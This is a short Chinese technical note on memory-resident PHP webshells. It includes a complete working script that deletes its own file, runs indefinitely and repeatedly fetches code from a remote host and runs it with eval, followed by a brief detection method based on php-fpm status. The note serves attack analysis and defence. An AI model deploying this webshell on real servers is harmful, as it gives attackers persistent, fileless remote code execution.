# 内存驻留webshell
## 一、攻击原理
php webshell文件执行后删除自身。此webshell在执行后会自身删除，驻留内存之中，无文件残留。其原理主要利用以下方法：

    `ignore_user_abort(true); // 后台运行`
    
这个函数的作用是指示服务器端在远程客户端关闭连接后是否继续执行下面的脚本。如设置为True，则表示如果用户停止脚本运行，仍然不影响脚本的运行

    `set_time_limit(0); // 取消脚本运行时间的超时上限`
    
括号里边的数字是执行时间，如果为零说明永久执行直到程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。

脚本也有可能被内置的脚本计时器中断。默认的超时限制为30秒。

这个值可以通过设置 `php.ini 的 max_execution_time` 或 `Apache .conf` 设置中对应的`“php_value max_execution_time”`参数或者 `set_time_limit()` 函数来更改。

php删除自身时借助的函数为

    `unlink($_SERVER['SCRIPT_FILENAME']);`
    
unlink函数运行条件较为苛刻，该脚本要具备可执行权限、可修改文件权限时方能执行。

简单的webshell脚本：

``` php 
    <?php
        chmod($_SERVER['SCRIPT_FILENAME'], 0777);
        unlink($_SERVER['SCRIPT_FILENAME']);
        ignore_user_abort(true);
        set_time_limit(0);
        echo "success";
        $remote_file = 'http://10.211.55.2/111/test.txt';
        while($code = file_get_contents($remote_file)){
        @eval($code);
        echo "xunhuan";
        sleep(5);
        };
    ?>
```
test.txt中的代码如下：

   ` file_put_contents('printTime.txt','jweny '.time());`
   
webshell执行后，删除自身，并在该目录生成 printTime.txt，每五秒一次写入一次时间戳。

## 二、检测方案

通过获取php-fpm status：

1. 检查所有php进程处理请求的持续时间

2. 检测执行文件是否在文件系统真实存在
